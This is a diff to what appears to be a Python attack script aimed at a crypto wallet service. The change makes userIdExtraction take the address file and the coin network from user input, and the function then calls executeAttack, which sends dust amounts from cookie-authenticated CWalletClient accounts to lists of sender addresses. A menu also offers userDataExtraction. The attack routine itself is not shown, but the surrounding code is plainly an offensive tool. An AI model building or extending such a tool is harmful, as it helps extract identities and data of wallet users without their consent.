@@ -244,7 +244,7 @@ def setup_logging(enabled: bool = True):
     logging.getLogger("asyncio").setLevel(logging.WARNING)
 
 
-async def userIdExtraction():
+async def userIdExtraction(addressesFileName, cryptoCoin):
     # Cookies
     clients = []
     cookies = [
@@ -263,10 +263,8 @@ async def userIdExtraction():
         clients.append(CWalletClient(authCookie=cookie, payPassCode="111111"))
 
     # Getting Addresses
-    addressesFileName = "unique_senders_alchemy_base.txt"
     resultsFileName = "results_eth.txt"
     amount = "0.00000001"
-    cryptoCoin = COINS["BASE"]
 
     await executeAttack(
         addressesFileName=addressesFileName,
@@ -302,7 +300,16 @@ async def main():
     choice = input("Enter choice: ")
 
     if choice == "0":
-        await userIdExtraction()
+        addressesFileName = input("Enter file name (including ending): ")
+        cryptoCoinName = input("Enter coin name [ERC, BTC, BEP, BASE, ARB, OPT, TRON, POLY, SOL, OPBNB, AVAX]: ")
+        cryptoCoinName = cryptoCoinName.upper()
+
+        if cryptoCoinName not in COINS:
+            print("Unsupported network")
+            return
+        cryptoCoin = COINS[cryptoCoinName]
+        await userIdExtraction(addressesFileName, cryptoCoin)
+
     elif choice == "1":
         await userDataExtraction()
     else:
